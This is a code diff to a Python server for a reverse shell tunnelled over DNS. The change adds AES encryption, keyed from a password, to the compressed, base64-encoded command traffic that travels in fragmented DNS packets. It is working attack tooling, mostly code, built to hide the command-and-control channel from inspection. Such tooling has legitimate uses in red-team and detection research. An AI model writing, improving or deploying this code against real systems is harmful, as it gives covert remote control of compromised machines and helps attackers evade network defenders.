@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 from scapy.all import IP, UDP, DNS, DNSRR, send, sniff
 from base64 import b64encode, b64decode
+from Crypto.Cipher import AES
 
 import threading
 import argparse
 import zlib
+import hashlib
 
 parser = argparse.ArgumentParser(description="DNS Reverse Shell Server")
 parser.add_argument('domain', metavar='domain', type=str, help='Domain to connect to')
@@ -14,11 +16,13 @@ parser.add_argument('-i',
                     type=str,
                     help='Interface to use',
                     default='eth0')
+parser.add_argument('-k', '--key', action='store', type=str, help='Password to use', required=True)
 
 args = parser.parse_args()
 
 IFACE = args.interface
 DOMAIN = args.domain
+KEY = hashlib.sha256(args.key.encode()).digest()
 
 FRAG_LEN = 70 - len(DOMAIN)
 
@@ -55,10 +59,33 @@ def reply(pkt, data=False) -> None:
     send(ip / udp / dns, iface=IFACE, verbose=False)
 
 
+# Encrypt data
+def encrypt(raw: bytes) -> bytes:
+
+    def _pad(s):
+        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) %
+                                                                    AES.block_size).encode()
+
+    cipher = AES.new(KEY, AES.MODE_CBC)
+    return cipher.iv + cipher.encrypt(_pad(raw))
+
+
+# Decrypt data
+def decrypt(enc: bytes) -> bytes:
+
+    def _unpad(s):
+        return s[:-ord(s[len(s) - 1:])]
+
+    iv = enc[:AES.block_size]
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    return _unpad(cipher.decrypt(enc[AES.block_size:]))
+
+
 # Encodes into base64 and fragments data into smaller pieces
 def encode(data: bytes) -> list:
     data = data.strip()
     data = zlib.compress(data)
+    data = encrypt(data)
     e_data = b64encode(data).decode()
     frag_e_data = [e_data[i:i + FRAG_LEN] for i in range(0, len(e_data), FRAG_LEN)]
     return frag_e_data
@@ -67,6 +94,7 @@ def encode(data: bytes) -> list:
 # Decode base64
 def decode(data: bytes) -> str:
     data = b64decode(data)
+    data = decrypt(data)
     data = zlib.decompress(data)
     return data.decode()
 
